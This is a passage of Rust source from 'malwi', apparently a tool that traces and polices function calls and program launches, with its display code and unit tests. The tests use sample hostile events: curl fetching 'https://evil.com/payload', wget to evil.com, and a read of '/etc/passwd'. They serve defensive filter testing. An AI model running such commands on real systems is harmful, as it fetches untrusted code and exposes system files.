                            prompt_review_decision(&event, state.output_writer.as_deref_mut())
                        }
                    }
                } else {
                    prompt_review_decision(&event, state.output_writer.as_deref_mut())
                }
            } else {
                prompt_review_decision(&event, state.output_writer.as_deref_mut())
            };
            let _ = response_tx.send(decision);
        }
    }
    Ok(())
}

/// Emit a "[malwi] denied:" message for a blocked event.
fn emit_blocked(
    event: &TraceEvent,
    rule: &str,
    section: &str,
    monitor: Option<&MonitorClient>,
    out: Option<&mut (dyn Write + '_)>,
) {
    let full = format_event_display_name(event);
    let src = format_source_location(&event.source_file, event.source_line);
    if let Some(client) = monitor {
        let mut blocked_event = event.clone();
        blocked_event.function = format!(
            "BLOCKED {} (policy: {} rule '{}')",
            event.function, section, rule
        );
        let _ = client.send_event(&blocked_event);
    } else if let Some(out) = out {
        let _ = writeln!(out, "{}[malwi] denied:{} {}{}", RED, RESET, full, src);
    }
}

/// Emit a "[malwi] warning:" message for a warned event.
fn emit_warning(
    event: &TraceEvent,
    monitor: Option<&MonitorClient>,
    out: Option<&mut (dyn Write + '_)>,
) {
    let full = format_event_display_name(event);
    let src = format_source_location(&event.source_file, event.source_line);
    if let Some(client) = monitor {
        let _ = client.send_event(event);
    } else if let Some(out) = out {
        let _ = writeln!(out, "{}[malwi] warning:{} {}{}", YELLOW, RESET, full, src);
    }
}

/// Prompt the user interactively for a review decision.
/// Used when no policy short-circuits the decision (i.e., Review disposition or no policy).
fn prompt_review_decision(
    event: &TraceEvent,
    out: Option<&mut (dyn Write + '_)>,
) -> ReviewDecision {
    print_review_summary(event);
    loop {
        print!("Approve? [Y/n/i]: ");
        let _ = std::io::stdout().flush();

        let mut input = String::new();
        if std::io::stdin().read_line(&mut input).is_err() {
            return ReviewDecision::Allow;
        }

        match input.trim().to_lowercase().as_str() {
            "n" => {
                let full = format_event_display_name(event);
                let src = format_source_location(&event.source_file, event.source_line);
                if let Some(out) = out {
                    let _ = writeln!(out, "{}[malwi] denied:{} {}{}", RED, RESET, full, src);
                }
                return ReviewDecision::Block;
            }
            "i" => {
                print_review_details(event);
                continue;
            }
            _ => {
                return ReviewDecision::Allow;
            }
        }
    }
}

// ANSI color codes
pub const LIGHT_BLUE: &str = "\x1b[94m";
pub const YELLOW: &str = "\x1b[93m";
pub const RED: &str = "\x1b[91m";
pub const DIM: &str = "\x1b[2m";
pub const RESET: &str = "\x1b[0m";

/// Map runtime identifier to display name.
fn display_runtime_name(runtime: &str) -> String {
    match runtime {
        "nodejs" => "Node.js".to_string(),
        "python" => "Python".to_string(),
        "bash" => "Bash".to_string(),
        other => other.to_string(),
    }
}

/// Get function name for display.
pub fn display_name(func: &str) -> &str {
    func
}

/// Format a trace event for display in denied/warning messages.
/// For exec events: "cmd arg1 arg2" style.
/// For other events: just the function name.
fn format_event_display_name(event: &TraceEvent) -> String {
    if event.hook_type == HookType::Exec {
        let name = display_name(&event.function);
        let start = 1.min(event.arguments.len());
        let args: Vec<String> = event.arguments[start..]
            .iter()
            .filter_map(|a| a.display.clone())
            .collect();
        let args_str = shell_format::format_shell_command(&args, 200);
        if args_str.is_empty() {
            name.to_string()
        } else {
            format!("{} {}", name, args_str)
        }
    } else if !event.arguments.is_empty() {
        let name = display_name(&event.function);
        let args: Vec<String> = event
            .arguments
            .iter()
            .map(|a| {
                a.display
                    .clone()
                    .unwrap_or_else(|| format!("{:#x}", a.raw_value))
            })
            .collect();
        format!("{}({})", name, args.join(", "))
    } else {
        event.function.clone()
    }
}

/// Print a brief summary for review mode prompt
fn print_review_summary(event: &TraceEvent) {
    let name = display_name(&event.function);

    // Format arguments (truncated for summary)
    let args: Vec<String> = event
        .arguments
        .iter()
        .take(3) // Limit to first 3 args for summary
        .map(|a| {
            let val = a
                .display
                .clone()
                .unwrap_or_else(|| format!("{:#x}", a.raw_value));
            if val.len() > 40 {
                format!("{}...", &val[..37])
            } else {
                val
            }
        })
        .collect();
    let args_str = if event.arguments.len() > 3 {
        format!("{}, ...", args.join(", "))
    } else {
        args.join(", ")
    };

    let src = format_source_location(&event.source_file, event.source_line);

    if args_str.is_empty() {
        println!("{}[malwi]{} {}{}", YELLOW, RESET, name, src);
    } else {
        println!(
            "{}[malwi]{} {}{}({}){}{}",
            YELLOW, RESET, name, DIM, args_str, RESET, src
        );
    }
}

/// Print detailed info for review mode 'i' option
fn print_review_details(event: &TraceEvent) {
    println!("{}--- Details ---{}", DIM, RESET);

    // Print file and line from first runtime stack frame if available
    match &event.runtime_stack {
        Some(RuntimeStack::Python(frames)) if !frames.is_empty() => {
            let f = &frames[0];
            println!("  {}File:{} {}:{}", DIM, RESET, f.filename, f.line);
        }
        Some(RuntimeStack::Nodejs(frames)) if !frames.is_empty() => {
            let f = &frames[0];
            println!(
                "  {}File:{} {}:{}:{}",
                DIM, RESET, f.script, f.line, f.column
            );
        }
        _ => {
            if !event.native_stack.is_empty() {
                println!("  {}At:{} {:#x}", DIM, RESET, event.native_stack[0]);
            }
        }
    }

    // Print full arguments
    println!("  {}Args:{}", DIM, RESET);
    for (i, arg) in event.arguments.iter().enumerate() {
        let val = arg
            .display
            .clone()
            .unwrap_or_else(|| format!("{:#x}", arg.raw_value));
        println!("    [{}] = {}", i, val);
    }

    // Print full stack trace
    if !event.native_stack.is_empty() || event.runtime_stack.is_some() {
        println!("  {}Stack:{}", DIM, RESET);

        // Runtime stack first
        match &event.runtime_stack {
            Some(RuntimeStack::Python(frames)) => {
                for frame in frames {
                    println!(
                        "    {}:{} in {}()",
                        frame.filename, frame.line, frame.function
                    );
                }
            }
            Some(RuntimeStack::Nodejs(frames)) => {
                for frame in frames {
                    println!(
                        "    {}:{}:{} in {}()",
                        frame.script, frame.line, frame.column, frame.function
                    );
                }
            }
            None => {}
        }

        // Native stack
        for &addr in &event.native_stack {
            println!("    {:#x}", addr);
        }
    }

    println!("{}---------------{}", DIM, RESET);
}

/// Format a native stack frame for display.
fn format_native_frame(frame: &malwi_protocol::NativeFrame) -> String {
    match (&frame.symbol, &frame.module, frame.offset) {
        (Some(sym), Some(module), Some(off)) if off > 0 => {
            format!("{}+{:#x} ({})", sym, off, module)
        }
        (Some(sym), Some(module), _) => {
            format!("{} ({})", sym, module)
        }
        (Some(sym), None, Some(off)) if off > 0 => {
            format!("{}+{:#x}", sym, off)
        }
        (Some(sym), None, _) => sym.clone(),
        (None, Some(module), Some(off)) => {
            format!("{}+{:#x}", module, off)
        }
        (None, Some(module), None) => module.clone(),
        _ => {
            format!("{:#x}", frame.address)
        }
    }
}

/// Format source location as a dimmed suffix for display.
///
/// Returns `"  filepath:line"` for known locations, or empty string if unknown.
pub fn format_source_location(source_file: &Option<String>, source_line: Option<u32>) -> String {
    match (source_file, source_line) {
        (Some(file), Some(line)) => {
            format!("  {}{}:{}{}", DIM, file, line, RESET)
        }
        (Some(file), None) => {
            format!("  {}{}{}", DIM, file, RESET)
        }
        _ => String::new(),
    }
}

fn print_trace_event(
    event: &TraceEvent,
    resolved_stack: &[malwi_protocol::NativeFrame],
    output: &mut Box<dyn Write>,
    stack_trace_enabled: bool,
) -> Result<()> {
    use malwi_protocol::EventType;

    // Only print ENTER events - skip LEAVE entirely
    if !matches!(event.event_type, EventType::Enter) {
        return Ok(());
    }

    let name = display_name(&event.function);
    let color = if event.hook_type == HookType::DirectSyscall {
        RED
    } else {
        LIGHT_BLUE
    };
    let src = format_source_location(&event.source_file, event.source_line);

    if event.hook_type == HookType::Exec {
        // Exec: "cmd arg1 arg2" style (skip argv[0] which is the function name)
        let start = 1.min(event.arguments.len());
        let args: Vec<String> = event.arguments[start..]
            .iter()
            .filter_map(|a| a.display.clone())
            .collect();
        let args_str = shell_format::format_shell_command(&args, 200);
        if args_str.is_empty() {
            writeln!(output, "{}[malwi]{} {}{}", color, RESET, name, src)?;
        } else {
            writeln!(
                output,
                "{}[malwi]{} {} {}{}{}{}",
                color, RESET, name, DIM, args_str, RESET, src
            )?;
        }
    } else {
        // Function call: "func(arg1, arg2)" style
        let args: Vec<String> = event
            .arguments
            .iter()
            .map(|a| {
                a.display
                    .clone()
                    .unwrap_or_else(|| format!("{:#x}", a.raw_value))
            })
            .collect();
        let args_str = args.join(", ");

        if args_str.is_empty() {
            writeln!(output, "{}[malwi]{} {}{}", color, RESET, name, src)?;
        } else {
            writeln!(
                output,
                "{}[malwi]{} {}{}({}){}{}",
                color, RESET, name, DIM, args_str, RESET, src
            )?;
        }
    }

    // Print stack traces if enabled
    if stack_trace_enabled {
        // Native stack frames
        for frame in resolved_stack {
            writeln!(
                output,
                "{}    at {}{}",
                DIM,
                format_native_frame(frame),
                RESET
            )?;
        }

        // Runtime stack frames (Python, V8, etc.)
        match &event.runtime_stack {
            Some(RuntimeStack::Python(frames)) => {
                for frame in frames {
                    writeln!(
                        output,
                        "{}    at {} ({}:{}){}",
                        DIM, frame.function, frame.filename, frame.line, RESET
                    )?;
                }
            }
            Some(RuntimeStack::Nodejs(frames)) => {
                for frame in frames {
                    writeln!(
                        output,
                        "{}    at {} ({}:{}:{}){}",
                        DIM, frame.function, frame.script, frame.line, frame.column, RESET
                    )?;
                }
            }
            None => {}
        }
    }

    output.flush()?;
    Ok(())
}

// =============================================================================
// TESTS
// =============================================================================

#[cfg(test)]
mod tests {
    use super::*;
    use malwi_protocol::{Argument, EventType};

    fn make_trace_event(function: &str, args: &[&str]) -> TraceEvent {
        TraceEvent {
            hook_type: HookType::default(),
            event_type: EventType::Enter,
            function: function.to_string(),
            arguments: args
                .iter()
                .map(|s| Argument {
                    raw_value: 0,
                    display: Some(s.to_string()),
                })
                .collect(),
            native_stack: vec![],
            runtime_stack: None,
            network_info: None,
            source_file: None,
            source_line: None,
        }
    }

    /// Make a TraceEvent that looks like an exec event (as produced by child_info_to_trace_event).
    /// argv[0] = cmd_name (same as function), argv[1..] = args
    fn make_exec_event(cmd: &str, args: &[&str]) -> TraceEvent {
        let mut all_args = vec![cmd];
        all_args.extend_from_slice(args);
        TraceEvent {
            hook_type: HookType::Exec,
            event_type: EventType::Enter,
            function: cmd.to_string(),
            arguments: all_args
                .iter()
                .map(|s| Argument {
                    raw_value: 0,
                    display: Some(s.to_string()),
                })
                .collect(),
            native_stack: vec![],
            runtime_stack: None,
            network_info: None,
            source_file: None,
            source_line: None,
        }
    }

    // --- format_source_location ---

    #[test]
    fn test_format_source_location_with_absolute_path() {
        let result = format_source_location(
            &Some("/usr/lib/python3.12/json/__init__.py".to_string()),
            Some(42),
        );
        assert!(result.contains("__init__.py:42"));
    }

    #[test]
    fn test_format_source_location_with_relative_path() {
        let result = format_source_location(&Some("<string>".to_string()), Some(1));
        assert!(result.contains("<string>:1"));
    }

    #[test]
    fn test_format_source_location_none() {
        let result = format_source_location(&None, None);
        assert!(result.is_empty());
    }

    #[test]
    fn test_format_source_location_file_only() {
        let result = format_source_location(&Some("script.py".to_string()), None);
        assert!(result.contains("script.py"));
        assert!(!result.contains(":"));
    }

    // --- parse_call_spec ---

    #[test]
    fn test_parse_call_spec_no_brackets() {
        assert_eq!(parse_call_spec("connect"), ("connect", None));
    }

    #[test]
    fn test_parse_call_spec_with_brackets() {
        assert_eq!(
            parse_call_spec("connect[*:443]"),
            ("connect", Some("*:443"))
        );
    }

    #[test]
    fn test_parse_call_spec_empty_brackets() {
        // Empty brackets should not parse as filter
        assert_eq!(parse_call_spec("connect[]"), ("connect[]", None));
    }

    #[test]
    fn test_parse_call_spec_with_bracket_filter() {
        assert_eq!(parse_call_spec("open[/etc/*]"), ("open", Some("/etc/*")));
    }

    #[test]
    fn test_parse_call_spec_nested_brackets() {
        // rfind('[') picks the last one, so nested brackets work
        assert_eq!(
            parse_call_spec("echo[*[test]*]"),
            ("echo[*", Some("test]*"))
        );
    }

    // --- FilterPattern ---

    #[test]
    fn test_parse_filter_pattern_normal() {
        let fp = FilterPattern::new("*:443");
        assert!(!fp.inverted);
        assert_eq!(fp.patterns, vec!["*:443"]);
    }

    #[test]
    fn test_parse_filter_pattern_inverted() {
        let fp = FilterPattern::new("!*:443");
        assert!(fp.inverted);
        assert_eq!(fp.patterns, vec!["*:443"]);
    }

    #[test]
    fn test_filter_pattern_matches() {
        let fp = FilterPattern::new("*:443");
        assert!(fp.matches("example.com:443"));
        assert!(!fp.matches("example.com:80"));
    }

    #[test]
    fn test_filter_pattern_inverted_matches() {
        let fp = FilterPattern::new("!*:443");
        assert!(!fp.matches("example.com:443"));
        assert!(fp.matches("example.com:80"));
    }

    #[test]
    fn test_filter_pattern_or_matches_any() {
        let fp = FilterPattern::new("*:443|*:80");
        assert!(fp.matches("example.com:443"));
        assert!(fp.matches("example.com:80"));
        assert!(!fp.matches("example.com:8080"));
    }

    #[test]
    fn test_filter_pattern_or_inverted() {
        let fp = FilterPattern::new("!*pypi.org*|*npmjs.org*");
        // Both excluded domains should be hidden
        assert!(!fp.matches("\"pypi.org\""));
        assert!(!fp.matches("\"registry.npmjs.org\""));
        // Unknown domain should pass through
        assert!(fp.matches("\"evil.com\""));
    }

    #[test]
    fn test_filter_pattern_or_no_match() {
        let fp = FilterPattern::new("*:443|*:80");
        assert!(!fp.matches("example.com:8080"));
    }

    #[test]
    fn test_filter_pattern_case_insensitive() {
        let fp = FilterPattern::new("!pypi.org|*.pypi.org");
        assert!(!fp.matches("PyPI.org"));
        assert!(!fp.matches("PYPI.ORG"));
        assert!(!fp.matches("files.PyPI.org"));
        assert!(fp.matches("evil.com"));
    }

    // --- ArgFilter ---

    #[test]
    fn test_arg_filter_per_function_matches() {
        let mut filter = ArgFilter::new();
        filter
            .per_function
            .insert("connect".to_string(), FilterPattern::new("*:443"));

        let event = make_trace_event("connect", &["example.com:443"]);
        assert!(filter.should_display_trace(&event));

        let event = make_trace_event("connect", &["example.com:80"]);
        assert!(!filter.should_display_trace(&event));

        // Unrelated function should pass through
        let event = make_trace_event("socket", &["AF_INET"]);
        assert!(filter.should_display_trace(&event));
    }

    #[test]
    fn test_arg_filter_exec_event() {
        let mut filter = ArgFilter::new();
        filter
            .per_function
            .insert("curl".to_string(), FilterPattern::new("*evil.com*"));

        let event = make_exec_event("curl", &["https://evil.com/payload"]);
        assert!(filter.should_display_trace(&event));

        let event = make_exec_event("curl", &["https://good.com/safe"]);
        assert!(!filter.should_display_trace(&event));

        // Unfiltered command passes through
        let event = make_exec_event("wget", &["https://evil.com"]);
        assert!(filter.should_display_trace(&event));
    }

    #[test]
    fn test_arg_filter_glob_function_key() {
        let mut filter = ArgFilter::new();
        filter
            .per_function
            .insert("fs.*".to_string(), FilterPattern::new("/etc/*"));

        let event = make_trace_event("fs.readFileSync", &["/etc/passwd"]);
        assert!(filter.should_display_trace(&event));

        let event = make_trace_event("fs.readFileSync", &["/tmp/safe"]);
        assert!(!filter.should_display_trace(&event));
    }

    #[test]
    fn test_arg_filter_inverted_excludes_match() {
        let mut filter = ArgFilter::new();
        filter
            .per_function
            .insert("connect".to_string(), FilterPattern::new("!*:443"));

        // Port 443 should be excluded
        let event = make_trace_event("connect", &["example.com:443"]);
        assert!(!filter.should_display_trace(&event));

        // Other ports should pass through
        let event = make_trace_event("connect", &["example.com:80"]);
        assert!(filter.should_display_trace(&event));
    }

    #[test]
    fn test_unfiltered_call_overrides_filtered() {
        // Simulate: -c 'connect[*:443]' -c 'connect'
        // The unfiltered 'connect' should override the filtered one
        let mut filter = ArgFilter::new();
        let mut unfiltered: HashSet<String> = HashSet::new();

        // First: filtered
        filter
            .per_function
            .insert("connect".to_string(), FilterPattern::new("*:443"));

        // Then: unfiltered
        unfiltered.insert("connect".to_string());
        filter.per_function.remove("connect");

        // All events should now pass
        let event = make_trace_event("connect", &["example.com:80"]);
        assert!(filter.should_display_trace(&event));
    }

    #[test]
    fn test_arg_filter_empty_passes_all() {
        let filter = ArgFilter::new();
        let event = make_trace_event("connect", &["anything"]);
        assert!(filter.should_display_trace(&event));
    }
}
